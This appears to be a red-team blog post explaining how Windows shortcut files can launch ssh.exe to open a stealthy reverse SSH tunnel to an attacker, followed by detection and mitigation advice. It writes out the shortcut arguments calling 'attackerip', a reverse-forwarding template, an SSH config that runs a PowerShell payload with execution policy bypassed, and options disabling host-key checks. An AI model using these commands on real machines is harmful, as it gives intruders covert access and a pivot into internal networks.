---
title: "SSHishing via Windows Shortcuts"
date: 2025-04-16 10:00:00 +0000
tags: [ssh, windows, shortcuts, cybersecurity, red-team]
categories: [malware-analysis, red-teaming]
pinned: false
---

## 1. Weaponizing Windows Shortcut Files (.lnk)

Windows `.lnk` files can be configured to execute arbitrary commands. Traditionally used by malware like Stuxnet, shortcut files are often disguised with misleading icons and filenames (e.g., PDFs, folders).

**Command Example:**

```plaintext
Target: C:\Windows\System32\OpenSSH\ssh.exe
Arguments: -R 1337:127.0.0.1:1337 user@attackerip -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -N
```

🔍 **What This Does:**

- Launches the built-in `ssh.exe`
- Connects to an attacker-controlled server
- Creates a reverse SSH tunnel from the victim to the attacker
- The `-N` flag ensures no shell is opened (stealthier)

---

## 2. Reverse Dynamic Port Forwarding

Using the `-R` SSH option, the attacker sets up a remote port forward. The victim machine becomes a proxy server, allowing the attacker to route traffic through the victim’s internal network.

**Reverse Tunnel Format:**

```plaintext
ssh -R [remote_port]:[local_host]:[local_port] user@attacker_ip
```

📌 **Example Use:**

- Expose an internal database or web app to the attacker
- Forward RDP or SMB ports
- Pivot deeper into the network from a compromised host

---

## 3. Enhancing with SSH Config + LocalCommand

By using an `.ssh/config` file on the attacker's side, additional functionality can be triggered post-connection.

**SSH Config Example:**

```ini
Host victim
    HostName attacker_ip
    Port 22
    User attacker
    LocalCommand powershell -ExecutionPolicy Bypass -File payload.ps1
    PermitLocalCommand yes
```

🧨 **What This Enables:**

- The attacker can execute local post-connection commands (e.g., launching a payload or modifying system settings)
- Bypasses launching PowerShell directly in the `.lnk` file, avoiding common detection rules

---

## 4. Bypassing Host Key Checks

For automation and stealth, options like the following are added:

```bash
-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
```

These suppress SSH warnings and allow automatic connections without host key verification, minimizing user friction.

---

## 🛡️ Detection & Mitigation

### Detection Techniques:
- Monitor for execution of `ssh.exe` outside normal use cases
- Flag command-line usage of reverse port forwarding (`-R`)
- Detect `.lnk` files invoking SSH commands
- Watch for outbound connections to uncommon ports/IPs
- Alert on local execution of SSH with `LocalCommand` enabled

### Recommended Defensive Actions:
- Use EDR/XDR tools to hunt for LOLBin abuse
- Disable unused features in Windows (e.g., OpenSSH client if not required)
- Educate users about suspicious files disguised as documents or shortcuts
- Enforce network segmentation and egress filtering

